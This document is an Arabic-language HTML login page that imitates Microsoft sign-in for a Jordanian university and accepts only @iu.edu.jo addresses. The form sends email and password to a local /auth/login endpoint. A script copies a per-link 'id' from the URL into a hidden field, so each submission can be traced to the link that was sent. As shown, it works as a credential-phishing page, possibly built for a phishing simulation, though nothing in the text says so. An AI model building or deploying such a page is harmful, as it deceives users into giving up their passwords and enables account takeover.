<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
      font-weight: normal;
    }
    .form-control {
      width: 100%;
      padding: 10px 35px 10px 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      text-align: left;
      direction: ltr;
      font-size: 14px;
      background-repeat: no-repeat;
      background-position: 8px center;
      background-size: 18px;
    }
    .form-control.email {
      background-image: url("https://img.icons8.com/ios-filled/50/000000/email.png");
    }
    .form-control.password {
      background-image: url("https://img.icons8.com/ios-filled/50/000000/key-security.png");
    }
    .error {
      color: #a80000;
      font-size: 13px;
      margin: 5px 0;
      display: none;
      text-align: right;
    }
    button {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #005a9e;
    }
    .extra-links {
      margin-top: 15px;
      font-size: 13px;
      text-align: right;
    }
    .extra-links a {
      color: #0067b8;
      text-decoration: none;
    }
    .extra-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
    <h2> تسجيل الدخول بإستخدام بريدك الجامعي</h2>
    <form id="loginForm" action="/auth/login" method="POST">
      <input type="email" name="email" class="form-control email" placeholder="البريد الإلكتروني" required>
      <div id="emailError" class="error">❌ يجب أن ينتهي البريد بـ @iu.edu.jo</div>

      <input type="password" name="password" class="form-control password" placeholder="كلمة المرور" required>
      <!-- حقل مخفي لتخزين الرابط المطلوب -->
      <input type="hidden" id="linkId" name="id">
      <button type="submit">تسجيل الدخول</button>
    </form>

    <div class="extra-links">
      <a href="#">هل نسيت كلمة المرور؟</a>
    </div>
  </div>

  <script>
    // قراءة قيمة id من رابط الصفحة وإضافتها للحقل المخفي
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    // التحقق من البريد
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      const emailInput = this.email.value.trim();
      const errorMsg = document.getElementById('emailError');

      if (!emailInput.endsWith('@iu.edu.jo')) {
        e.preventDefault();
        errorMsg.style.display = 'block';
      } else {
        errorMsg.style.display = 'none';
      }
    });
  </script>
</body>
</html>
